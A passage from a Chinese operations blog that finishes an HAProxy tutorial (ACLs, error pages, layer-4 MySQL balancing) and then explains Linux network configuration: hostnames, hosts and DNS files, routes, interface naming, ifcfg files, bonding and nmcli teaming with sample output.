<td align="center">method PUT</td>
<td align="center">match HTTP PUT method</td>
</tr>
<tr>
<td align="center">METH_TRACE</td>
<td align="center">method TRACE</td>
<td align="center">match HTTP TRACE method</td>
</tr>
<tr>
<td align="center">RDP_COOKIE</td>
<td align="center">req_rdp_cookie_cnt gt 0</td>
<td align="center">match presence of an RDP cookie</td>
</tr>
<tr>
<td align="center">REQ_CONTENT</td>
<td align="center">req_len gt 0</td>
<td align="center">match data in the request buffer</td>
</tr>
<tr>
<td align="center">TRUE</td>
<td align="center">always_true</td>
<td align="center">always match</td>
</tr>
<tr>
<td align="center">WAIT_END</td>
<td align="center">wait_end</td>
<td align="center">wait for end of content analysis</td>
</tr>
</tbody></table>
<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">http-request deny <span class="token keyword">if</span> METH_TRACE HTTP_1.1 	<span class="token comment"># 引用预定义的ACL，多个ACL默认为与关系</span></code></pre>

<h3 id="自定义-HAProxy-错误界面"><a href="#自定义-HAProxy-错误界面" class="headerlink" title="自定义 HAProxy 错误界面"></a>自定义 HAProxy 错误界面</h3><p>：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">errorfile <span class="token operator">&lt;</span>code<span class="token operator">></span> <span class="token operator">&lt;</span>file<span class="token operator">></span>		<span class="token comment"># 自定义错误页</span>
    <span class="token operator">&lt;</span>code<span class="token operator">></span> 	<span class="token comment"># HTTP status code.支持200, 400, 403, 405, 408, 425, 429, 500, 502，503,504</span>
    <span class="token operator">&lt;</span>file<span class="token operator">></span> 	<span class="token comment"># 包含完整HTTP响应头的错误页文件的绝对路径。 建议后缀".http"，以和一般的html文件相区分</span>

errorloc <span class="token operator">&lt;</span>code<span class="token operator">></span> <span class="token operator">&lt;</span>url<span class="token operator">></span>		<span class="token comment"># 错误页面重定向</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">defaults
	<span class="token punctuation">..</span>.
    errorfile <span class="token number">400</span> /etc/haproxy/errorfiles/400badreq.http
    errorfile <span class="token number">403</span> /etc/haproxy/errorfiles/403forbid.http
    <span class="token comment"># errorfile 503 /etc/haproxy/errorfiles/503sorry.http</span>
    errorloc <span class="token number">503</span> http://www.magedu.com/error_pages/503.html		<span class="token comment"># 重定向</span></code></pre>

<h3 id="HAProxy-四层负载"><a href="#HAProxy-四层负载" class="headerlink" title="HAProxy 四层负载"></a>HAProxy 四层负载</h3><p>问题: 后端服务器和 haproxy 还是和客户端建立三次握手?</p>
<p>答：HAProxy，因为 HAProxy 是伪四层，LVS 是真四层，不过，即使是伪四层，四层负载也比七层代理性能要高</p>
<p><strong>四层负载示例：</strong></p>
<p>注意：如果使用 frontend 和 backend，一定在 frontend 和 backend 段中都指定 mode tcp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 对MySQL服务实现四层负载</span>
listen magedu_mysql
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:3306
    mode tcp
    balance leastconn
    server mysql1 <span class="token number">10.0</span>.0.17:3306 check
    server mysql2 <span class="token number">10.0</span>.0.27:3306 check 		<span class="token comment"># 如果不写端口号，可以转发，但无法check状态</span>

<span class="token comment"># 或者使用frontend和backend实现</span>
frontend mysql
    <span class="token builtin class-name">bind</span> :3306
    mode tcp 		<span class="token comment"># 必须指定tcp模式</span>
    default_backend mysqlsrvs
backend mysqlsrvs
    mode tcp 		<span class="token comment"># 必须指定tcp模式</span>
    balance leastconn
    server mysql1 <span class="token number">10.0</span>.0.17:3306
    server mysql2 <span class="token number">10.0</span>.0.27:3306</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ACL示例-四层访问控制</span>
acl invalid_src src <span class="token number">192.168</span>.1.0/24 <span class="token number">10.0</span>.0.8		<span class="token comment"># 定义acl</span>
tcp-request connection reject <span class="token keyword">if</span> invalid_src 	<span class="token comment"># tcp-request，走的是四层的拒绝</span></code></pre>

<h3 id="HAProxy-https-实现"><a href="#HAProxy-https-实现" class="headerlink" title="HAProxy https 实现"></a>HAProxy https 实现</h3><p>haproxy 可以实现 https 的证书安全，但基于性能考虑，生产中证书都是在后端服务器比如 nginx 上实现，在 HAProxy 上采用四层负载，监听 ip:443，然后直接转发，让后端服务器去处理 https 证书</p>
<h2 id="本章重点总结"><a href="#本章重点总结" class="headerlink" title="本章重点总结"></a>本章重点总结</h2><ul>
<li>HAProxy 调度算法</li>
<li>动静分离与客户端源 IP 透传</li>
<li>ACL 使用与报文修改</li>
<li>服务器动态下线</li>
<li>编写 shell 脚本，实现能够基于参数传递 Real Server 服务器 IP，并实现将其从多个 HAProxy 进程下线与上线</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/Ubuntu%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/Ubuntu%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">Ubuntu网络配置</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 23:02:26" itemprop="dateCreated datePublished" datetime="2021-01-01T23:02:26+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">网络配置</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 22:55:48" itemprop="dateCreated datePublished" datetime="2021-01-01T22:55:48+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>将 Linux 主机接入到网络，需要配置网络相关设置。一般包括如下内容：</p>
<pre class="language-none"><code class="language-none">- 主机名
- IP&#x2F;netmask
- 路由：默认网关
- DNS服务器
  - 主DNS服务器
  - 次DNS服务器
  - 第三个DNS服务器</code></pre>

<p>命令修改的配置一般都是临时的，重启机器就失效了，如果要让配置更改永久生效，需要将配置更改写入到相关的配置文件中</p>
<h2 id="相关配置文件"><a href="#相关配置文件" class="headerlink" title="相关配置文件"></a>相关配置文件</h2><h3 id="配置当前主机的主机名"><a href="#配置当前主机的主机名" class="headerlink" title="配置当前主机的主机名"></a>配置当前主机的主机名</h3><p>永久修改：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#centos6 之前版本</span>
/etc/sysconfig/network
<span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>
<span class="token comment">#centos7 以后版 使用 hostnametcl set-hostname xxx 命令 或者修改文件</span>
/etc/hostname
<span class="token environment constant">HOSTNAME</span></code></pre>

<h3 id="本地主机名数据库和-IP-地址的映射"><a href="#本地主机名数据库和-IP-地址的映射" class="headerlink" title="本地主机名数据库和 IP 地址的映射"></a>本地主机名数据库和 IP 地址的映射</h3><p>优先级高于 DNS</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/etc/hosts

<span class="token comment"># 修改hostname后一定要修改hosts文件，保证本机主机名会解析到127.0.0.1</span>
<span class="token number">127.0</span>.0.1 本机主机名

<span class="token comment">#ip 主机名 别名</span>
<span class="token number">10.0</span>.1.1 k8s-master1.ljk.cn master1</code></pre>

<p>生产中，因为 ip 的不确定性，所以局域网中主机间通信不依赖 ip，而是依赖主机名，具体实现有两种方法：</p>
<ol>
<li>局域网中的主机不多：所有主机共同维护一份 hosts，记录每个 ip 和主机名之间的解析关系</li>
<li>局域网中的主机很多：搭建 DNS 服务</li>
</ol>
<h3 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS 域名解析"></a>DNS 域名解析</h3><p><a target="_blank" rel="noopener" href="https://blog.51cto.com/allenh/1880377">&#x2F;etc&#x2F;resolv.conf</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nameserver DNS_SERVER_IP1
nameserver DNS_SERVER_IP2
nameserver DNS_SERVER_IP3
search DOMAIN</code></pre>

<p>nmcli 会将配置的 DNS 写入到这个文件，但是不管 nmcli 给 connection 有没有配置 DNS 或是配置的什么，最终解析域名还是以这个文件中的 DNS 为准，所以建议直接修改这个文件。</p>
<p><code>search DOMAIN</code>是当域名无法 DNS 解析时，会将 DOMAIN 加到域名后面再尝试进行解析，例如：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#cat /etc/resolv.conf</span>
<span class="token comment"># Generated by NetworkManager</span>
search lujinkai.cn
nameserver <span class="token number">180.76</span>.76.76
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ping blog</span>
PING blog.lujinkai.cn <span class="token punctuation">(</span><span class="token number">47.105</span>.171.233<span class="token punctuation">)</span> <span class="token number">56</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span> bytes of data.
<span class="token number">64</span> bytes from <span class="token number">47.105</span>.171.233 <span class="token punctuation">(</span><span class="token number">47.105</span>.171.233<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">128</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">24.0</span> ms
<span class="token number">64</span> bytes from <span class="token number">47.105</span>.171.233 <span class="token punctuation">(</span><span class="token number">47.105</span>.171.233<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">128</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">23.5</span> ms</code></pre>

<h3 id="修改-x2F-etc-x2F-host-和-DNS-的优先级"><a href="#修改-x2F-etc-x2F-host-和-DNS-的优先级" class="headerlink" title="修改&#x2F;etc&#x2F;host 和 DNS 的优先级"></a>修改&#x2F;etc&#x2F;host 和 DNS 的优先级</h3><p>&#x2F;etc&#x2F;nsswitch.conf</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hosts:      files dns myhostname</code></pre>

<h3 id="路由相关的配置文件"><a href="#路由相关的配置文件" class="headerlink" title="路由相关的配置文件"></a>路由相关的配置文件</h3><p>新建文件 &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;route-IFACE</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">两种风格：
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> TARGET via GW
如：10.0.0.0/8 via <span class="token number">172.16</span>.0.1

<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> 每三行定义一条路由
ADDRESS<span class="token comment">#=TARGET</span>
NETMASK<span class="token comment">#=mask</span>
GATEWAY<span class="token comment">#=GW</span></code></pre>

<p>不推荐直接修改配置文件，推荐使用 nmcli：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 添加一条路由: 0.0.0.0 via 10.0.0.8</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token variable">$nmcli</span> connection modify eth0 ipv4.addresses <span class="token number">0.0</span>.0.0 ipv4.gateway <span class="token number">10.0</span>.0.8
<span class="token punctuation">[</span>root@centos8 network-scripts<span class="token punctuation">]</span><span class="token variable">$route</span> <span class="token parameter variable">-n</span>
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
<span class="token number">0.0</span>.0.0         <span class="token number">10.0</span>.0.8        <span class="token number">0.0</span>.0.0         UG    <span class="token number">100</span>    <span class="token number">0</span>        <span class="token number">0</span> eth0</code></pre>

<h3 id="网卡相关配置文件"><a href="#网卡相关配置文件" class="headerlink" title="网卡相关配置文件"></a>网卡相关配置文件</h3><h4 id="修改网卡设备名"><a href="#修改网卡设备名" class="headerlink" title="修改网卡设备名"></a>修改网卡设备名</h4><p>网卡组成格式：</p>
<pre class="language-latex" data-language="latex"><code class="language-latex">en: Ethernet 有线局域网
wl: wlan 无线局域网
ww: wwan无线广域网
o&lt;index>: 集成设备的设备索引号
s&lt;slot>: 扩展槽的索引号
x&lt;MAC>: 基于MAC地址的命名
p&lt;bus>s&lt;slot>: enp2s1</code></pre>

<p>CentOS6 之前网卡的默认命名方式 eth0、eth1、eth2。。。从 CentOS&#x2F;RHEL7 起，可预见的命名规则变成了默认。这一规则，接口名称被自动基于固件，拓扑结构和位置信息来确定。现在，即使添加或移除网络设备，接口名称仍然保持固定，而无需重新枚举，和坏掉的硬件可以无缝替换。</p>
<p>修改 CentOS7、8 的网卡设备名为 CentOS6 形式：</p>
<ol>
<li><p>编辑&#x2F;etc&#x2F;default&#x2F;grub 配置文件，给 GRUB_CMDLINE_LINUX 选项添加 net.ifnames&#x3D;0 字段，如果是戴尔的机器，还需要再加 biosdevname&#x3D;0</p>
</li>
<li><p>为 grub2 生成其配置文件：<code>grub2-mkconfig -o /etc/grub2.cfg</code></p>
<p>如果是 ubuntu：<code>sudo grub-mkconfig -o /boot/grub/grub.cfg</code></p>
</li>
</ol>
<h4 id="静态指定-IP"><a href="#静态指定-IP" class="headerlink" title="静态指定 IP"></a>静态指定 IP</h4><p>在<code>/etc/sysconfig/network-scripts</code>下新建文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">NAME</span><span class="token operator">=</span>eth0
<span class="token assign-left variable">DEVICE</span><span class="token operator">=</span>eth0
<span class="token assign-left variable">BOOTPROTO</span><span class="token operator">=</span>static
<span class="token assign-left variable">IPADDR</span><span class="token operator">=</span><span class="token number">10.0</span>.0.6
<span class="token assign-left variable">PREFIX</span><span class="token operator">=</span><span class="token number">24</span>	<span class="token comment"># 子网掩码</span>
<span class="token assign-left variable">GATEWAY</span><span class="token operator">=</span><span class="token number">10.0</span>.0.2	<span class="token comment"># 网关，也就是路由器</span>
<span class="token assign-left variable">DNS1</span><span class="token operator">=</span><span class="token number">223.6</span>.6.6
<span class="token assign-left variable">DNS2</span><span class="token operator">=</span><span class="token number">180.76</span>.76.76
<span class="token assign-left variable">ONBOOT</span><span class="token operator">=</span>yes</code></pre>

<h4 id="动态分配-IP"><a href="#动态分配-IP" class="headerlink" title="动态分配 IP"></a>动态分配 IP</h4><p>也是在<code>/etc/sysconfig/network-scripts</code>下新建文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">DEVICE</span><span class="token operator">=</span>eth0
<span class="token assign-left variable">NAME</span><span class="token operator">=</span>eth0
<span class="token assign-left variable">BOOTPROTO</span><span class="token operator">=</span>dhcp
<span class="token assign-left variable">ONBOOT</span><span class="token operator">=</span>yes</code></pre>

<h4 id="网卡别名"><a href="#网卡别名" class="headerlink" title="网卡别名"></a>网卡别名</h4><p>还是在<code>/etc/sysconfig/network-scripts</code>下新建文件，网卡别名必须使用静态地址</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">DEVICE</span><span class="token operator">=</span>eth0:1
<span class="token assign-left variable">IPADDR</span><span class="token operator">=</span><span class="token number">11.0</span>.0.6
<span class="token assign-left variable">PREFIX</span><span class="token operator">=</span><span class="token number">8</span></code></pre>

<p>修改完后 <code>service network restart</code>重启服务即可</p>
<p>以上是 CentOS6 配置网卡的方式，CentOS7、8 不推荐手动修改文件，推荐使用 nmcli 命令自动生成配置文件。</p>
<h2 id="多网卡"><a href="#多网卡" class="headerlink" title="多网卡"></a>多网卡</h2><p>将多块网卡绑定同一 IP 地址对外提供服务，可以实现高可用或者负载均衡。直接给两块网卡设置同一 IP 地址是不可以的。通过 Bonding 或 Teaming，虚拟一块网卡对外提供连接，物理网卡的被修改为相同的 MAC 地址。</p>
<h3 id="Bonding"><a href="#Bonding" class="headerlink" title="Bonding"></a>Bonding</h3><p>共 7 种模式，0-6mode：</p>
<p>0：轮询、1：活动-备份、3：广播</p>
<p>说明：active-backup、balance-tlb 和 balance-alb 模式不需要交换机的任何特殊配置。其他绑定模式需要配置交换机以便整合链接。如：Cisco 交换机需要在模式 0、2 和 3 中使用 EtherChannel，但在模式 4 中需要 LACP 和 EtherChannel。</p>
<p>实现 bonding 模式 1：</p>
<p>创建 bonding 设备的配置文件&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-bond0：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">NAME</span><span class="token operator">=</span>bond0
<span class="token assign-left variable">TYPE</span><span class="token operator">=</span>bond
<span class="token assign-left variable">DEVICE</span><span class="token operator">=</span>bond0
<span class="token assign-left variable">BOOTPROTO</span><span class="token operator">=</span>none
<span class="token assign-left variable">IPADDR</span><span class="token operator">=</span><span class="token number">10.0</span>.0.100
<span class="token assign-left variable">PREFIX</span><span class="token operator">=</span><span class="token number">8</span>
<span class="token assign-left variable">BONDING_OPTS</span><span class="token operator">=</span><span class="token string">"mode=1 miimon=100"</span></code></pre>

<p>修改两个 eth0 和 eth1 两个网卡的配置</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">NAME</span><span class="token operator">=</span>eth0
<span class="token assign-left variable">DEVICE</span><span class="token operator">=</span>eth0
<span class="token assign-left variable">BOOTPROTO</span><span class="token operator">=</span>none
<span class="token assign-left variable">MASTER</span><span class="token operator">=</span>bond0
<span class="token assign-left variable">SLAVE</span><span class="token operator">=</span>yes
<span class="token assign-left variable">ONBOOT</span><span class="token operator">=</span>yes</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">NAME</span><span class="token operator">=</span>eth1
<span class="token assign-left variable">DEVICE</span><span class="token operator">=</span>eth1
<span class="token assign-left variable">BOOTPROTO</span><span class="token operator">=</span>none
<span class="token assign-left variable">MASTER</span><span class="token operator">=</span>bond0
<span class="token assign-left variable">SLAVE</span><span class="token operator">=</span>yes
<span class="token assign-left variable">ONBOOT</span><span class="token operator">=</span>yes</code></pre>

<p>查看 bond0 状态：<code>/proc/net/bonding/bond0</code></p>
<p>删除 bond0：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> bond0 down
rmmod bonding</code></pre>

<h3 id="Teaming"><a href="#Teaming" class="headerlink" title="Teaming"></a>Teaming</h3><p>从 CentOS7 开始，不推荐使用 bonding，推荐使用网络组，网络组提供更好的性能和扩展性。网络组由内核驱动和 teamd 守护进程实现。</p>
<p>网络组也有多种模式：broadcast、roundrobin、activebackup、loadbalance、lacp (implements the 802.3ad Link Aggregation Control Protocol)</p>
<p>网络组特点：</p>
<ul>
<li>启动网络组接口不会自动启动网络组中的 port 接口</li>
<li>启动网络组接口中的 port 接口总会自动启动网络组接口</li>
<li>禁用网络组接口会自动禁用网络组中的 port 接口</li>
<li>没有 port 接口的网络组接口可以启动静态 IP 连接</li>
<li>启用 DHCP 连接时，没有 port 接口的网络组会等待 port 接口的加入</li>
</ul>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建网络组接口，虽然使用connection创建，但好像使用device来创建更符合逻辑</span>
nmcli con <span class="token function">add</span> <span class="token builtin class-name">type</span> team con-name CNAME ifname INAME <span class="token punctuation">[</span>config JSON<span class="token punctuation">]</span>
CNAME 连接名
INAME 接口名，也随便写。其他连接ifname是指定关联的物理网卡接口，而网络组是软件，所以这里的ifname不是指定，是定义
JSON 指定runner方式,格式：<span class="token string">'&#123;"runner": &#123;"name": "METHOD"&#125;&#125;'</span>
METHOD 可以是broadcast, roundrobin, activebackup, loadbalance, lacp

<span class="token comment"># 创建port接口</span>
nmcli con <span class="token function">add</span> <span class="token builtin class-name">type</span> team-slave con-name CNAME ifname INAME master TEAM
CNAME 连接名,连接名若不指定，默认为team-slave-IFACE
INAME 网络接口名
TEAM 网络组接口名

<span class="token comment"># 断开和启动</span>
nmcli dev dis INAME
nmcli con up CNAME
INAME 设备名 CNAME 网络组接口名或port接口</code></pre>

<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 添加网络组接口</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli con add type team con-name con-team0 ifname if-team0 config '&#123;"runner":&#123;"name": "loadbalance"&#125;&#125;' ipv4.addresses 10.0.0.88/24 ipv4.method manual</span>
Connection <span class="token string">'con-team0'</span> <span class="token punctuation">(</span>6a08e7d5-473e-4bed-bc6d-2065efc296c4<span class="token punctuation">)</span> successfully added.
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli device</span>
DEVICE    TYPE      STATE      CONNECTION
eth0      ethernet  connected  eth0
eth1      ethernet  connected  eth1
eth2      ethernet  connected  eth2
eth3      ethernet  connected  eth3
if-team0  team      connected  con-team0
lo        loopback  unmanaged  --

<span class="token comment"># 给eth0、eth1、eth2三个网卡接口添加连接，并加入到网络组</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli con add con-name team0-eth1 type team-slave ifname eth1 master if-team0</span>
Connection <span class="token string">'team0-eth1'</span> <span class="token punctuation">(</span>66aad47b-4d03-49ef-bcc7-d628f77f3256<span class="token punctuation">)</span> successfully added.
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli con add con-name team0-eth2 type team-slave ifname eth2 master if-team0</span>
Connection <span class="token string">'team0-eth2'</span> <span class="token punctuation">(</span>175ea1cb-05a8-4f97-b756-eae6ec844a43<span class="token punctuation">)</span> successfully added.
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli con add con-name team0-eth3 type team-slave ifname eth3 master if-team0</span>
Connection <span class="token string">'team0-eth3'</span> <span class="token punctuation">(</span>d021a567-5c2c-4528-acdb-e01f25d80988<span class="token punctuation">)</span> successfully added.
<span class="token comment"># 看一下连接状态，新创建的连接还没有激活</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli connection</span>
NAME        UUID                                  TYPE      DEVICE
eth0        d9c122c4-1861-45f3-826f-a1fff455543c  ethernet  eth0
eth1        8c913f0c-de22-4fa9-a153-9de53621de5a  ethernet  eth1
eth2        0ee56953-0b62-4181-9987-fb09da4dacd9  ethernet  eth2
eth3        8028cae7-39b5-4656-8ad8-e82b1adf0025  ethernet  eth3
con-team0   6a08e7d5-473e-4bed-bc6d-2065efc296c4  team      if-team0
team0-eth1  66aad47b-4d03-49ef-bcc7-d628f77f3256  ethernet  --
team0-eth2  175ea1cb-05a8-4f97-b756-eae6ec844a43  ethernet  --
team0-eth3  d021a567-5c2c-4528-acdb-e01f25d80988  ethernet  --
<span class="token comment"># 看一下网络组的状态，组内的连接都还没启动</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># teamdctl if-team0 state</span>
setup:
  runner: loadbalance

<span class="token comment"># 一个网卡接口可以关联多个连接，但同时只能有一个活跃，切换加入了网络组的连接为活跃状态</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli connection up team0-eth1</span>
Connection successfully activated <span class="token punctuation">(</span>D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/14<span class="token punctuation">)</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli connection up team0-eth2</span>
Connection successfully activated <span class="token punctuation">(</span>D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/15<span class="token punctuation">)</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># nmcli connection up team0-eth3</span>
Connection successfully activated <span class="token punctuation">(</span>D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/16<span class="token punctuation">)</span>
Connection successfully activated <span class="token punctuation">(</span>D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/16<span class="token punctuation">)</span>

<span class="token comment"># 看一下网络组的状态，都启动了</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># teamdctl if-team0 state</span>
setup:
  runner: loadbalance
ports:
  eth1
    <span class="token function">link</span> watches:
      <span class="token function">link</span> summary: up
      instance<span class="token punctuation">[</span>link_watch_0<span class="token punctuation">]</span>:
        name: <span class="token function">ethtool</span>
        link: up
        down count: <span class="token number">0</span>
  eth2
    <span class="token function">link</span> watches:
      <span class="token function">link</span> summary: up
      instance<span class="token punctuation">[</span>link_watch_0<span class="token punctuation">]</span>:
        name: <span class="token function">ethtool</span>
        link: up
        down count: <span class="token number">0</span>
  eth3
    <span class="token function">link</span> watches:
      <span class="token function">link</span> summary: up
      instance<span class="token punctuation">[</span>link_watch_0<span class="token punctuation">]</span>:
        name: <span class="token function">ethtool</span>
        link: up
        down count: <span class="token number">0</span></code></pre>

